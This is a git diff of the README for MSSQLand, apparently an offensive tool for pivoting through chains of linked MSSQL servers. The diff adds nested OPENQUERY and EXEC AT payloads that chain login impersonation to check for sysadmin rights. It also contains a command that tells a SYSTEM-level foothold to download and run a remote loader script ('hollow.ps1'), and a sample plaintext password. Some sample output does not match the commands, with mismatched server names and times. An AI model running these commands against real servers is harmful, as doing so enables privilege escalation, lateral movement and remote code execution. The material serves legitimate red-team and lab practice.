@@ -17,7 +17,7 @@ MSSQLand.exe /t:SQL01:webapp01 /u:mjo /p:yapot117 /c:local /l:SQL02:webapp03,SQL
 Create the following output:
 ```txt
 ====================================
-  Start at 2025-01-15 21:53:53
+  Start at 2025-01-15 21:53:53 UTC
 ====================================
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
@@ -43,14 +43,30 @@ Create the following output:
 ```
 
 ## Show Time 👑
-The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` as `user1`. Then you need to impersonate `user2` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `user3` in order to go further and so on and so forth.
+The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth.
 
 Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you! 🎯
 
-After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? No thanks. Let MSSQLand  handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
+After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 
+
+This is what it looks like to verify if you are `sysadmin` in `SQL03` when you have to impersonate `webapp03` on `SQL02` and `webapp04` on `SQL03`:
+
+- [OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_data_access_enabled`):
+
+```sql
+SELECT * FROM OPENQUERY("SQL02", 'EXECUTE AS LOGIN = ''webapp03''; SELECT * FROM OPENQUERY("SQL03", ''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') REVERT;')
+```
+
+- [RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_rpc_out_enabled`):
 
 ```shell
-MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
+EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') AT SQL03; REVERT;') AT SQL02
+```
+
+No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
+
+```shell
+MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
 ```
 
 The output is as follows:
@@ -74,9 +90,9 @@ The output is as follows:
 [>] Executing action: Links
 |-> Retrieving Linked SQL Servers
 
-| Linked Server | product    | provider | data_source | Local Login | Is Self Mapping | Remote Login |
-| ------------- | ---------- | -------- | ----------- | ----------- | --------------- | ------------ |
-| SQL05         | SQL Server | SQLNCLI  | SQL04       | webapp05    | False           | webadmin     |
+| Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
+| -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |
+| 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webapps      | True    | True      | False     |
 
 ====================================
   End at 2025-01-14 21:31:39 UTC
@@ -86,13 +102,13 @@ The output is as follows:
 
 Now you want to verify who you can impersonate at the end of the chain:
 ```shell
-MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
+MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
 ```
 The output shows:
 
 ```txt
 ====================================
-  Start at 2025-01-14 08:35:22 UTC
+  Start at 2025-01-14 21:35:22 UTC
 ====================================
 [>] Trying to connect with TokenCredentials
 [+] Connection opened successfully
@@ -100,9 +116,9 @@ The output shows:
 |-> Server Version: 15.00.2000
 |-> Database: master
 |-> Client Connection ID: a6a69aa9-b8cc-4c93-9bc4-c162dc67806f
-[>] Attempting to impersonate user: webapp11
+[>] Attempting to impersonate user: webapp02
 [i] You can impersonate anyone as a sysadmin
-[+] Successfully impersonated user: webapp11
+[+] Successfully impersonated user: webapp02
 [i] Server chain: SQL11 -> SQL27 -> SQL53
 [i] Logged in as webapps
 |-> Mapped to the user guest
@@ -118,14 +134,14 @@ The output shows:
 | Moulinier   | No            |
 
 ====================================
-  End at 2025-01-14 08:35:22
+  End at 2025-01-14 21:35:22  UTC
   Total duration: 0.10 seconds
 ====================================
 ```
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 And yes, all the outputted tables are Markdown friendly. What a kind gesture!
@@ -136,18 +152,52 @@ And yes, all the outputted tables are Markdown friendly. What a kind gesture!
 Use the `/silent` switch for a streamlined experience. It minimizes output, showing only the action results, making it particularly useful for some engagements where less is more.
 
 ## Project Structure 📚
+This project follows several key software development principles and practices.
 
-### `Actions`
-This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.
+1. **Single Responsability Principle (SRP)**
 
-### `Services`
+Each class should have one, and only one, reason to change. Each action class in the [`Actions`](./MSSQLand/Actions) directory, like [`Tables`](./MSSQLand/Actions/Database/Tables.cs), [`Permissions`](./MSSQLand/Actions/Database/Permissions.cs), or [`Smb`](./MSSQLand/Actions/Network/Smb.cs), is responsible for a single operation.
+The [`Logger`](./MSSQLand/Utilities/Logger.cs) class solely handles logging, decoupling it from other logic.
+
+3. **Open/Close Principle (OCP)**
+
+Software entities should be open for extension but closed for modification. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) abstract class defines a common interface-like for all actions. New actions can be added by inheriting from it without modifying existing code. Then, the [`ActionFactory`](./MSSQLand/Actions/ActionFactory.cs) enables seamless addition of new actions by simply adding them to the switch case.
+
+4. **Liskov Substitution Principle (LSP)**
+
+Subtypes should be substitutable for their base types without altering program behavior. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) class ensures all derived actions (e.g., Tables, Permissions, Smb) can be used interchangeably, provided they implement `ValidateArguments` and `Execute`.
+
+5. **DRY (Don't Repeat Yourself)**
+
+Avoid duplicating logic across the codebase. The [`QueryService`](./MSSQLand/Services/QueryService.cs) centralizes query execution, avoiding repetition in individual actions.
+
+6. **KISS (Keep It Simple, Stupid)**
+
+Systems should be as simple as possible but no simpler. Complex linked server queries and impersonation are abstracted into services, simplifying their usage.
+
+8. Extensibility
+
+The system should be easy to extend with new features. New actions can be added without altering core functionality by extending [`BaseAction`](./MSSQLand/Actions/BaseAction.cs).
+
+#### Directories
+
+- [`Models`](./MSSQLand/Models)
+
+Contains classes representing SQL Server entities, such as Server and LinkedServers.
+
+- [`Services`](./MSSQLand/Services)
+
 The backbone of the application, responsible for connection management, query execution, user management, and configuration handling.
 
-### `Utilities`
+- [`Actions`](./MSSQLand/Actions)
+
+This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.
+
+- [`Utilities`](./MSSQLand/Utilities)
+
 Helper classes like Logger and MarkdownFormatter that make your life easier.
 
-### `Models` Folder
-Contains classes representing SQL Server entities, such as Server and LinkedServers.
+
 
 ## Contributing 🫂
 
